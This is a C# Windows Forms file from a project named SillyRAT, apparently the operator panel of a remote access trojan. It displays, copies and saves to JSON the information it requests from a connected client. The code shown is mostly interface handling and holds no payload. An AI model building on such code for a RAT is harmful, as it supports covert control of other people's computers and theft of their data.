using System;
using Stuff;
using System.Windows.Forms;
using Server.Connection;
using System.Threading;
using System.Text;
using System.Collections.Generic;
using System.IO;
using Newtonsoft.Json;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Drawing2D;

namespace SillyRAT.ClientForms
{
    public partial class FormInformation : Form
    {
        [DllImport("user32.dll")]
        private static extern bool ShowScrollBar(IntPtr hWnd, int wBar, bool bShow);
        private const int SB_VERT = 1;

        private bool isMouseDown = false;

        private Point mouseOffset;

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        public SillyClient SillyClient { get; set; }

        public FormInformation()
        {
            InitializeComponent();
        }

        private void FormInformation_Load(object sender, EventArgs e)
        {
            ShowScrollBar(listView1.Handle, SB_VERT, true);
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            this.Paint += Form_Paint;
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Clientinfo");
            SillyClient.Send(pack.Pacc());
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                stringBuilder.AppendLine(item.Text + " // " + item.SubItems[1].Text);
            }
            string copyData = stringBuilder.ToString();
            if (!string.IsNullOrEmpty(copyData))
            {
                Thread meow = new Thread(() => Clipboard.SetText(copyData));
                meow.SetApartmentState(ApartmentState.STA);
                meow.Start();
                meow.Join();
            }
        }

        private void saveJSONToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var itemsList = new List<Dictionary<string, string>>();

            foreach (ListViewItem item in listView1.Items)
            {
                var dict = new Dictionary<string, string>
                {
                    { "Information", item.SubItems[0].Text },
                    { "Content", item.SubItems[1].Text }
                };
                itemsList.Add(dict);
            }

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "JSON files (*.json)|*.json|All files (*.*)|*.*";
                saveFileDialog.Title = "Client information saving";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string json = JsonConvert.SerializeObject(itemsList, Formatting.Indented);
                    File.WriteAllText(saveFileDialog.FileName, json);
                    MessageBox.Show("Client information saved", "Save", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void contextMenuStrip1_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
